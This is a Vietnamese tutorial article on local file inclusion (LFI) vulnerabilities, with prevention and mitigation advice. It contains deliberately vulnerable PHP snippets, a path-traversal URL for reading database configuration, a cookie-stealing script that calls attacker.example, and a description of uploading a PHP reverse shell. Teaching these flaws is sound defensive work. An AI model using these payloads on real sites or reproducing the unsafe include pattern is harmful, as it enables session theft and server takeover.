# **Local file inclusion (LFI) là gì?**  

  Local file inclusion (LFI) là một lỗ hổng web cho phép tin tặc độc hại truy cập, xem và/hoặc bao gồm các tệp nằm trong hệ thống tệp máy chủ web trong thư mục gốc của tài liệu.  

<img width="701" alt="image" src="https://user-images.githubusercontent.com/125866921/229335005-2e527b6f-90c5-4d14-879d-133e56aca5c3.png">

# **Local file inclusion (LFI) hoạt động như thế nào?**  

  Khi viết các ứng dụng web, các nhà phát triển thường cần truy cập các tệp phía máy chủ bổ sung nằm trong thư mục ứng dụng hoặc thư mục con của nó. Ví dụ: các nhà phát triển có thể muốn bao gồm các tệp cấu hình và mô-đun ứng dụng hoặc để truy cập và hiển thị các tệp do người dùng tải lên, chẳng hạn như tệp hình ảnh hoặc văn bản.  

  Để truy cập các tệp không tĩnh, các nhà phát triển thường chuyển tên tệp thông qua các tham số đầu vào của người dùng. Ví dụ: nếu ứng dụng hiển thị hình ảnh do người dùng tải lên, tác giả của ứng dụng có thể quyết định cho phép đặt tên tùy ý cho những hình ảnh này. Trong trường hợp các ngôn ngữ kịch bản như PHP, các nhà phát triển cũng có thể cần tự động đưa vào các tệp chứa mã nguồn.  

  Local file inclusion vulnerabilities xảy ra khi người dùng độc hại có thể bao gồm tên tệp hoặc đường dẫn tùy ý trong thông tin nhập của người dùng. Ví dụ: nếu một ứng dụng được thiết kế để hiển thị hình ảnh tùy ý dựa trên tham số URL, nhưng kẻ tấn công có thể sử dụng chức năng này để hiển thị mã nguồn ứng dụng thì ứng dụng đó có lỗ hổng LFI. Lưu ý rằng nếu kẻ tấn công có thể bao gồm một tệp độc hại từ một vị trí từ xa , thì chúng ta đang nói về lỗ hổng remote file inclusion (RFI) vulnerability.  
    
# **Local file inclusion vs Directory traversal**  

  Local file inclusion thường bị nhầm lẫn với directory traversal, lưu ý rằng chúng tương tự nhưng không đồng nghĩa với nhau.  
    
  - *LFI có nghĩa là kẻ tấn công có thể bao gồm các tệp mã nguồn hoặc xem các tệp nằm trong thư mục gốc của tài liệu và các thư mục con của nó, nhưng điều đó không có nghĩa là kẻ tấn công có thể tiếp cận bên ngoài thư mục gốc của tài liệu.*  
        
  - *Directory traversal có nghĩa là kẻ tấn công có thể truy cập các tệp nằm bên ngoài thư mục gốc của tài liệu , chẳng hạn như tệp nhật ký hoặc tệp passwd và cuộc tấn công không liên quan đến việc chạy bất kỳ mã độc hại nào.*  

  Hai lỗ hổng thường bị nhầm lẫn vì chúng thường xảy ra cùng nhau và có cùng nguyên nhân gốc rễ: nhà phát triển cho phép chuyển đường dẫn đến các tệp cục bộ như một phần đầu vào của người dùng ( CWE- 73 ).  
    
  Lưu ý: Một số định nghĩa coi việc Local file inclusion bị giới hạn trong các trường hợp tệp được bao gồm chứa mã nguồn và cũng được thực thi. Ví dụ: trong chỉ mục CWE, định nghĩa về bao gồm tệp cục bộ là CWE-98: Kiểm soát tên tệp không đúng đối với câu lệnh bao gồm/yêu cầu trong chương trình PHP.  
    
# **Ví dụ về cuộc tấn công LFI**

  Dưới đây là các ví dụ về mã PHP với các lỗ hổng bao gồm tệp cục bộ, cũng như các vectơ tấn công LFI khác nhau trên các ứng dụng bao gồm mã này.  
  
# *LFI dẫn đến tiết lộ thông tin nhạy cảm*

  Nhà phát triển ứng dụng PHP muốn người dùng có thể đọc các bài thơ được lưu trữ trong các tệp văn bản trên máy chủ web. Những bài thơ này được ghi vào tệp văn bản, được tải lên bởi những người dùng khác và được lưu trữ trong một thư mục thơ tương đối . Sau đó, các bài thơ được hiển thị trong trình duyệt web như một phần của trang HTML. Sau đây là một đoạn mã từ tệp poems/display.php file.  
  
    <?PHP 
    $file = $_GET["file"];
    $handle = fopen($file, 'r');
    $poem = fread($handle, 1);
    fclose($handle);
    echo $poem;
    ?>  

  Như bạn có thể thấy, tên tệp được lấy trực tiếp từ tiêu đề yêu cầu HTTP. Do đó, bạn có thể truy cập và hiển thị một bài thơ có tên là poems.txt bằng URL sau:  
  
    http://victim.example/my_app/display.php?file=poem.txt  
    
# *Vectơ tấn công*
  
  Kẻ tấn công lạm dụng tập lệnh này bằng cách thao túng yêu cầu GET bằng tải trọng sau:  
      
      http://victim.example/my_app/display.php?file=../config/database.php
      
  Tập lệnh display.php điều hướng lên thư mục gốc của tài liệu rồi xuống thư mục con /config/ . Ở đó, nó bao gồm tệp cấu hình cơ sở dữ liệu database.php , chứa tên người dùng và mật khẩu được sử dụng để kết nối với cơ sở dữ liệu. Dữ liệu bị lộ dưới dạng một phần của mã HTML và kẻ tấn công chỉ cần kiểm tra mã nguồn của trang để tìm hiểu cách truy cập trực tiếp vào cơ sở dữ liệu.  
    
# **LFI dẫn đến XSS**

  Những kẻ tấn công cũng có thể sử dụng mã ở trên để nâng cấp cuộc tấn công XSS.  
  
# *Vectơ tấn công*

  Trước tiên, kẻ tấn công sử dụng chức năng tải lên tệp thơ để tải lên  **poem** sau đây dưới dạng tệp văn bản có tên là poems.txt:  
  
      <script>fetch("http://attacker.example?log="+encodeURIComponent(document.cookie));</script>

  Sau đó, kẻ tấn công gửi yêu cầu đưa bài thơ vào:  
  
      http://victim.example/my_app/display.php?file=poem42.txt  
      
  Vì nội dung của bài thơ được dự định sẽ được hiển thị trực tiếp như một phần của mã HTML, mã trang hiện bao gồm một lỗ hổng XSS. Kẻ tấn công có thể gửi liên kết này tới bất kỳ số lượng nạn nhân nào và bất kỳ ai mở nó sẽ nhận được cookie phiên của họ được gửi đến trang webattack.example do kẻ tấn công kiểm soát.  
# **LFI dẫn đến thực thi mã từ xa**  

  Nhà phát triển của cùng một ứng dụng PHP cũng muốn có thể bao gồm các mô-đun một cách linh hoạt. Sau đây là đoạn mã từ tệp index.php.  
  
    <?PHP 
    $module = $_GET["module"];
    include $module;
    ?>
    
  Một lần nữa, tên tệp được lấy trực tiếp từ yêu cầu GET HTTP. Do đó, bạn có thể bao gồm mô-đun welcome.php như sau:  
  
    http://victim.example/index.php?module=welcome.php  
    
 # *Vectơ tấn công*  
 
  Đầu tiên, kẻ tấn công sử dụng chức năng tải lên bài thơ để tải lên poem42.txt , chứa mã nguồn PHP của pentest monkey reverse shell.  
  
  Sau đó, kẻ tấn công thao túng yêu cầu GET tới index.php để đưa bài thơ vào thay vì một mô-đun:  
  
    http://victim.example/index.php?module=poems/poem42.txt  
    
  Kết quả là, ứng dụng chạy mã của reverse shell (remote code execution), cấp cho kẻ tấn công quyền truy cập từ xa vào dòng lệnh của máy chủ.  
  
# **Hậu quả tiềm ẩn của một cuộc tấn công LFI**  
  
  Như bạn có thể thấy từ các ví dụ trên, các lỗ hổng bao gồm tệp cục bộ có thể gây ra nhiều hậu quả, tùy thuộc vào chức năng của ứng dụng dễ bị tấn công. Dưới đây là một số ví dụ:  
  
  - *Nếu ứng dụng hiển thị hình ảnh tùy ý, nó có thể được sử dụng để hiển thị thông tin nhạy cảm như mã nguồn hoặc tệp cấu hình.*  
    
  - *Nếu ứng dụng cho phép bạn tải xuống các tệp tùy ý, chẳng hạn như tệp PDF, thì ứng dụng đó có thể được sử dụng để tải xuống thông tin nhạy cảm như mã nguồn hoặc tệp cấu hình.*  
    
  - *Nếu ứng dụng bao gồm nội dung tệp tùy ý như một phần của trang HTML, nó có thể được sử dụng để khai thác các lỗ hổng XSS.*  
    
  - *Nếu ứng dụng tự động bao gồm các tệp mã nguồn tùy ý và kẻ tấn công có thể tải lên hoặc thay đổi tệp, thì nó có thể được sử dụng để leo thang thành thực thi mã từ xa.*  
    
# **Ví dụ về các lỗ hổng bao gồm tệp cục bộ nổi tiếng**  

  **Vụ hack 2016 Adult Friend Finder** : Những kẻ tấn công đã sử dụng lỗ hổng LFI để xâm phạm 412 triệu tài khoản, làm lộ e-mail, mật khẩu cũng như dữ liệu bí mật như sở thích tình dục và tình trạng hôn nhân. Công ty đã được cảnh báo về lỗ hổng trước đó nhưng đã không khắc phục nó ngay lập tức.  
  
  **Vụ hack Weather.gov năm 2012** : Những kẻ tấn công đã sử dụng LFI và truyền tải thư mục để thu thập thông tin nhạy cảm từ máy chủ dịch vụ thời tiết quốc gia.  
  
  **Lỗ hổng TimThumb năm 2011** : Lỗ hổng LFI trong tập lệnh bổ sung WordPress đã được sử dụng để xâm phạm hơn 1,2 triệu trang web chỉ trong năm 2011. Mặc dù thực tế là addon dễ bị tấn công này đã bị loại bỏ vào năm 2014, **nhưng các nhà phát triển vẫn đang sử dụng nó.**  

# **Làm cách nào để phát hiện các lỗ hổng**  

Cách tốt nhất để phát hiện các lỗ hổng bao gồm tệp cục bộ phụ thuộc vào việc chúng đã được biết hay chưa.  
  
  - *Nếu bạn chỉ sử dụng phần mềm thương mại hoặc nguồn mở và không phát triển phần mềm của riêng mình, thì bạn có thể thấy nó đủ để xác định phiên bản chính xác của hệ thống hoặc ứng dụng mà bạn đang sử dụng. Nếu phiên bản được xác định dễ bị bao gồm tệp cục bộ, bạn có thể cho rằng bạn dễ bị tổn thương bao gồm tệp cục bộ đó. Bạn có thể xác định phiên bản theo cách thủ công hoặc sử dụng công cụ bảo mật phù hợp, chẳng hạn như phần mềm phân tích thành phần phần mềm (SCA) trong trường hợp ứng dụng web hoặc trình quét mạng trong trường hợp hệ thống và ứng dụng nối mạng.*  
  
  - *Nếu bạn phát triển phần mềm của riêng mình hoặc muốn tìm các lỗ hổng bao gồm tệp cục bộ không xác định (zero-days) trong các ứng dụng đã biết, bạn phải có khả năng khai thác thành công lỗ hổng bao gồm tệp cục bộ để chắc chắn rằng nó tồn tại. Trong những trường hợp như vậy, bạn cần thực hiện kiểm tra thâm nhập thủ công với sự trợ giúp của nhà nghiên cứu bảo mật hoặc người kiểm tra thâm nhập hoặc sử dụng công cụ kiểm tra bảo mật ứng dụng (máy quét lỗ hổng web) có thể tự động khai thác lỗ hổng. Ví dụ về các công cụ như vậy là Invicti và Acunetix của Invicti . Chúng tôi khuyên bạn nên sử dụng phương pháp này ngay cả đối với các lỗ hổng đã biết.*  
  
# **Làm cách nào để ngăn chặn các lỗ hổng LFI trong các ứng dụng web?**  

Có một số phương pháp cho phép bạn ngăn chặn các lỗ hổng LFI trong mã của mình:  

  - *Hoàn toàn tránh chuyển tên tệp trong đầu vào của người dùng. Điều này không chỉ bao gồm đầu vào trực tiếp của người dùng mà còn bao gồm cả các nguồn dữ liệu khác mà kẻ tấn công có thể thao túng, chẳng hạn như cookie.*  
  
  - *Nếu ứng dụng của bạn yêu cầu bạn sử dụng tên tệp từ đầu vào của người dùng và không có cách nào khác, hãy tạo danh sách trắng gồm các tệp an toàn.*  
  
  - *Nếu bạn không thể tạo danh sách cho phép vì bạn sử dụng tên tệp tùy ý (ví dụ: nếu người dùng tải tệp lên), hãy lưu trữ tên tệp trong cơ sở dữ liệu và sử dụng số nhận dạng hàng trong bảng khi người dùng nhập. Bạn cũng có thể sử dụng ánh xạ URL để xác định các tệp không có rủi ro bao gồm tệp cục bộ.*  
  
  Các phương pháp trên có sẵn trong mọi ngôn ngữ lập trình và do đó mọi nhà phát triển có thể dễ dàng ngăn chặn các lỗ hổng LFI bằng cách sử dụng các kỹ thuật mã hóa an toàn. Không có lý do gì để xuất hiện lỗ hổng LFI trong mã của bạn.  
  
  Lưu ý: Không dựa vào danh sách đen, mã hóa hoặc các phương pháp xác thực/khử trùng đầu vào, chẳng hạn như lọc để ngăn việc đưa vào tệp cục bộ. Ví dụ: đừng cố giới hạn hoặc thực thi các phần mở rộng tệp hoặc chặn các chuỗi ký tự đặc biệt như là biện pháp bảo vệ duy nhất của bạn khỏi LFI. Kẻ tấn công có thể vượt qua các bộ lọc như vậy bằng cách sử dụng một số phương pháp khác nhau như mã hóa URL và trình bao bọc chẳng hạn như php://filter
  
# **Làm cách nào để giảm thiểu các cuộc tấn công LFI?.**  

Các phương pháp giảm thiểu các cuộc tấn công LFI sẽ khác nhau tùy thuộc vào loại phần mềm:  

  - *Trong trường hợp các ứng dụng web tùy chỉnh, bạn có thể giảm thiểu các cuộc tấn công LFI bằng cách chạy ứng dụng web của mình trong một môi trường hạn chế, điều này rất phổ biến đối với các API web. Ví dụ: thay vì chạy tất cả các ứng dụng của bạn trên một máy chủ Linux với Apache, bạn có thể chạy từng ứng dụng trong một bộ chứa Docker riêng biệt. Điều này sẽ giới hạn số lượng tệp mà kẻ tấn công có thể truy cập – chúng sẽ không thể truy cập các ứng dụng khác trong cùng một thư mục gốc của web.*  
  
  - *Trong trường hợp tệp cục bộ đã biết bao gồm trong phần mềm của bên thứ ba, chẳng hạn như phần mềm quản trị cho bộ định tuyến phần cứng và tường lửa, bạn phải kiểm tra các tư vấn bảo mật mới nhất để tìm cách khắc phục và cập nhật lên phiên bản không dễ bị tổn thương.*  
  
Trong trường hợp zero-day LFI trong phần mềm của bên thứ ba, bạn có thể áp dụng các quy tắc **WAF (web application firewall)** tạm thời để giảm thiểu. Tuy nhiên, điều này chỉ làm cho việc LFI khó khai thác hơn và không loại bỏ được sự cố.
